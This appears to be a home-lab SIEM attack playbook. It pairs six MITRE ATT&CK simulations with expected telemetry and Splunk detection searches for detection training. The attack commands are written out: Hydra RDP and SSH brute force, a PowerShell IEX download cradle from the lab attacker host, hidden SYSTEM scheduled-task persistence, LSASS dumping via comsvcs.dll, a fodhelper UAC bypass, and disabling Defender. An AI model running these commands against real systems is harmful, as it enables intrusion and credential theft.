<![CDATA[# ⚔️ Attack Playbook

Step-by-step procedures for simulating adversary behavior in the SIEM Home Lab. Each attack maps to a specific MITRE ATT&CK technique and is designed to generate detectable telemetry.

---

## Table of Contents

1. [Pre-Attack Checklist](#pre-attack-checklist)
2. [Attack 1: RDP Brute Force (T1110.001)](#attack-1-rdp-brute-force-t1110001)
3. [Attack 2: SSH Brute Force (T1110.001)](#attack-2-ssh-brute-force-t1110001)
4. [Attack 3: Suspicious PowerShell Execution (T1059.001)](#attack-3-suspicious-powershell-execution-t1059001)
5. [Attack 4: Scheduled Task Persistence (T1053.005)](#attack-4-scheduled-task-persistence-t1053005)
6. [Attack 5: Credential Dumping — LSASS (T1003.001)](#attack-5-credential-dumping--lsass-t1003001)
7. [Attack 6: Privilege Escalation — UAC Bypass (T1548.002)](#attack-6-privilege-escalation--uac-bypass-t1548002)
8. [Post-Attack Analysis](#post-attack-analysis)

---

## Pre-Attack Checklist

Before running any simulation:

- [ ] All VMs are running and network connectivity is confirmed
- [ ] Splunk is receiving events from all endpoints (check with `index=* | stats count by host`)
- [ ] Sysmon service is running on the Windows endpoint
- [ ] Take a VM snapshot on each target machine (for easy restoration)
- [ ] Note the current timestamp for log correlation

---

## Attack 1: RDP Brute Force (T1110.001)

**Attacker**: Kali Linux (10.0.0.10)
**Target**: Windows Server (10.0.0.20)
**MITRE Technique**: [T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)

### Method A: Hydra (Kali)

```bash
# From Kali Linux
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.0.20 -t 4 -V -f
```

### Method B: Automated Script

```bash
cd attack-simulations/kali-attacks/
chmod +x rdp_bruteforce.sh
./rdp_bruteforce.sh 10.0.0.20 Administrator
```

### Expected Telemetry

| Log Source | Event ID | Description |
|---|---|---|
| Windows Security | 4625 | Failed logon attempts (multiple) |
| Windows Security | 4624 | Successful logon (if password found) |
| Sysmon | Event 3 | Network connections on port 3389 |

### Splunk Verification

```spl
index=wineventlog EventCode=4625 Logon_Type=10
| stats count by src_ip, Account_Name
| where count > 5
| sort -count
```

---

## Attack 2: SSH Brute Force (T1110.001)

**Attacker**: Kali Linux (10.0.0.10)
**Target**: Ubuntu Server (10.0.0.30)
**MITRE Technique**: [T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)

### Method A: Hydra (Kali)

```bash
hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.30 -t 4 -V -f
```

### Method B: Automated Script

```bash
cd attack-simulations/kali-attacks/
chmod +x ssh_bruteforce.sh
./ssh_bruteforce.sh 10.0.0.30 ubuntu
```

### Expected Telemetry

| Log Source | Field | Description |
|---|---|---|
| auth.log | `Failed password` | Repeated failed SSH authentication |
| auth.log | `Accepted password` | Successful SSH login (if cracked) |
| auditd | `USER_LOGIN` | Login audit events |

### Splunk Verification

```spl
index=linux sourcetype=linux:auth "Failed password"
| rex "Failed password for (?<user>\S+) from (?<src_ip>\S+)"
| stats count by src_ip, user
| where count > 5
| sort -count
```

---

## Attack 3: Suspicious PowerShell Execution (T1059.001)

**Target**: Windows Server (10.0.0.20)
**MITRE Technique**: [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)

### Method A: Atomic Red Team

```powershell
# On Windows target — run as Administrator
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3
```

### Method B: Manual Simulation

```powershell
# Encoded command execution (commonly used by malware)
$command = "Write-Host 'SIEM Lab Test - Encoded PowerShell Execution'"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -EncodedCommand $encodedCommand

# Download cradle (simulated — points to localhost)
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.10/test.ps1')"

# Suspicious cmdlet usage
powershell.exe -Command "Get-Process; Get-Service; Get-WmiObject Win32_OperatingSystem"
```

### Expected Telemetry

| Log Source | Event ID | Description |
|---|---|---|
| Sysmon | Event 1 | Process creation with PowerShell details |
| PowerShell | 4104 | Script block logging — full script content |
| PowerShell | 4103 | Module logging |
| Windows Security | 4688 | Process creation with command line |

### Splunk Verification

```spl
index=sysmon EventCode=1 Image="*\\powershell.exe"
  (CommandLine="*-EncodedCommand*" OR CommandLine="*-enc*"
   OR CommandLine="*DownloadString*" OR CommandLine="*IEX*"
   OR CommandLine="*Invoke-Expression*" OR CommandLine="*Net.WebClient*"
   OR CommandLine="*Bypass*")
| table _time, Computer, User, ParentImage, CommandLine
| sort -_time
```

---

## Attack 4: Scheduled Task Persistence (T1053.005)

**Target**: Windows Server (10.0.0.20)
**MITRE Technique**: [T1053.005 — Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)

### Method A: Atomic Red Team

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1,2
```

### Method B: Manual Simulation

```powershell
# Create a scheduled task for persistence
schtasks /create /tn "SystemHealthCheck" /tr "powershell.exe -WindowStyle Hidden -Command 'Start-Sleep -Seconds 60'" /sc onlogon /ru SYSTEM /f

# Verify
schtasks /query /tn "SystemHealthCheck" /v /fo LIST

# Clean up after detection
schtasks /delete /tn "SystemHealthCheck" /f
```

### Expected Telemetry

| Log Source | Event ID | Description |
|---|---|---|
| Sysmon | Event 1 | schtasks.exe process creation |
| Windows Security | 4698 | Scheduled task created |
| Windows Security | 4702 | Scheduled task updated |

### Splunk Verification

```spl
index=sysmon EventCode=1 Image="*\\schtasks.exe" CommandLine="*/create*"
| table _time, Computer, User, ParentImage, CommandLine
```

---

## Attack 5: Credential Dumping — LSASS (T1003.001)

**Target**: Windows Server (10.0.0.20)
**MITRE Technique**: [T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

### Method A: Atomic Red Team

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 1,2
```

### Method B: Manual Simulation

```powershell
# Dump LSASS process memory using rundll32 (mimics common attack)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Alternative: Use Task Manager
# Right-click lsass.exe → Create dump file
```

> ⚠️ **Warning**: This attack may trigger Windows Defender. Ensure AV exclusions or disable real-time protection in the lab.

### Expected Telemetry

| Log Source | Event ID | Description |
|---|---|---|
| Sysmon | Event 10 | Process access targeting lsass.exe |
| Sysmon | Event 1 | rundll32.exe or procdump execution |
| Sysmon | Event 11 | File creation of .dmp file |

### Splunk Verification

```spl
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| table _time, Computer, SourceImage, SourceUser, GrantedAccess
| sort -_time
```

---

## Attack 6: Privilege Escalation — UAC Bypass (T1548.002)

**Target**: Windows Server (10.0.0.20)
**MITRE Technique**: [T1548.002 — Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)

### Method A: Atomic Red Team

```powershell
Invoke-AtomicTest T1548.002 -TestNumbers 1,2
```

### Method B: Manual Simulation

```powershell
# Fodhelper UAC Bypass
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "powershell.exe -Command Start-Process cmd.exe -Verb RunAs" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process fodhelper.exe

# Clean up
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### Expected Telemetry

| Log Source | Event ID | Description |
|---|---|---|
| Sysmon | Event 13 | Registry value set under ms-settings |
| Sysmon | Event 1 | fodhelper.exe → elevated cmd.exe |
| Windows Security | 4688 | Elevated process creation |

### Splunk Verification

```spl
index=sysmon EventCode=13 TargetObject="*\\ms-settings\\*"
| table _time, Computer, User, Image, TargetObject, Details
| sort -_time
```

---

## Post-Attack Analysis

After each attack simulation:

1. **Verify Detection**: Check if the corresponding Splunk alert fired
2. **Capture Evidence**: Take screenshots of Splunk search results
3. **Document Findings**: Create an incident report using the template in `incident-reports/TEMPLATE.md`
4. **Assess Rule Accuracy**: Note any false positives or missed detections
5. **Tune Rules**: Update detection logic as needed and log changes in `tuning/tuning_changelog.md`
6. **Restore Snapshot**: Revert the target VM to a clean state

> **Proceed to**: [`TRIAGE_WORKFLOW.md`](TRIAGE_WORKFLOW.md) for the alert triage methodology.
]]>
